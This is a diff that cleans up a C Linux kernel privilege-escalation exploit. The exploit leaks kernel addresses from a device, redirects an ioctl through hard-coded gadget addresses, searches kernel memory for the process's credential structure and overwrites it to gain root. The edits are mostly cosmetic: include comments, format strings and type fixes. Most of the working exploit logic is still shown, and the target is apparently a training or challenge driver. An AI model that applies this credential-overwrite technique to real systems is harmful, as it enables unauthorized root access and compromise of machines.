@@ -1,11 +1,11 @@
-#include <fcntl.h>
-#include <stdbool.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <sys/ioctl.h>
-#include <sys/prctl.h>
-#include <unistd.h>
+#include <fcntl.h>      // for open, O_NOCTTY, O_RDONLY, O_RDWR
+#include <inttypes.h>   // for uintptr_t, uint32_t, uint8_t, PRIx64
+#include <stdbool.h>    // for true
+#include <stdio.h>      // for printf, perror, NULL, size_t
+#include <stdlib.h>     // for EXIT_FAILURE, EXIT_SUCCESS
+#include <sys/ioctl.h>  // for ioctl
+#include <sys/prctl.h>  // for prctl, PR_SET_NAME
+#include <unistd.h>     // for read, close, execve, write
 
 int fd;
 int tty[100];
@@ -16,8 +16,8 @@ uintptr_t offset;
 
 uintptr_t g_buf;
 
-uintptr_t mov_prdx_ecx	= 0xffffffff814b27c2;
-uintptr_t mov_eax_prdx	= 0xffffffff81440428;
+uintptr_t mov_prdx_ecx = 0xffffffff814b27c2;
+uintptr_t mov_eax_prdx = 0xffffffff81440428;
 
 static void leak_offset_and_g_buf(void)
 {
@@ -25,10 +25,10 @@ static void leak_offset_and_g_buf(void)
 
 	read(fd, data, 0x440);
 	offset = *(uintptr_t *)&data[0x418] - 0xffffffff81c38880;
-	printf("[+] offset %p\n", offset);
+	printf("[+] offset %#" PRIx64 "\n", offset);
 
 	g_buf = *(uintptr_t *)&data[0x438] - 0x438;
-	printf("[+] g_buf %p\n", g_buf);
+	printf("[+] g_buf %#" PRIx64 "\n", g_buf);
 }
 
 static void set_ioctl(uintptr_t ptr)
@@ -44,7 +44,7 @@ static void set_ioctl(uintptr_t ptr)
 
 static uint32_t fast_ioctl(int op, uintptr_t argp)
 {
-	uint32_t ret;
+	int ret;
 
 	if (target) {
 		ret = ioctl(target, op, argp);
@@ -70,14 +70,14 @@ static uintptr_t search_cred(void)
 
 	if (prctl(PR_SET_NAME, name) == -1) {
 		perror("[-] prctl");
-		return -1;
+		return (uintptr_t)NULL;
 	}
 
 	set_ioctl(OFFSET(mov_eax_prdx));
 
 	while (true) {
 		if (ptr >= g_buf)
-			return -1;
+			return (uintptr_t)NULL;
 
 		tmp = fast_ioctl(0, ptr);
 		if (tmp != *(uint32_t *)name) {
@@ -112,19 +112,19 @@ static uintptr_t search_cred(void)
 	return cred;
 }
 
-static void aaw(uintptr_t ptr, uint8_t *buf, size_t len)
+static void aaw(uintptr_t ptr, char *buf, size_t len)
 {
 	size_t left = len;
 	uint32_t tmp;
 
 	set_ioctl(OFFSET(mov_prdx_ecx));
 
-	for (int i = 0; i < len; i += 4, left -= 4) {
+	for (size_t i = 0; i < len; i += 4, left -= 4) {
 		if (left >= 4) {
 			tmp = *(uint32_t *)(buf + i);
 		} else {
 			tmp = 0;
-			for (int i = 0; i < left; ++i)
+			for (size_t i = 0; i < left; ++i)
 				tmp |= (uint32_t)(*(uint8_t *)(buf + i))
 				       << (3 - i) * 8;
 		}
@@ -163,11 +163,11 @@ int main(void)
 
 	printf("[+] searching cred ...\n");
 	cred = search_cred();
-	if (cred == -1) {
+	if (!cred) {
 		printf("[-] cred not found\n");
 		return EXIT_FAILURE;
 	} else {
-		printf("[+] cred %p\n", cred);
+		printf("[+] cred %#" PRIx64 "\n", cred);
 	}
 
 	aaw(cred + 4,
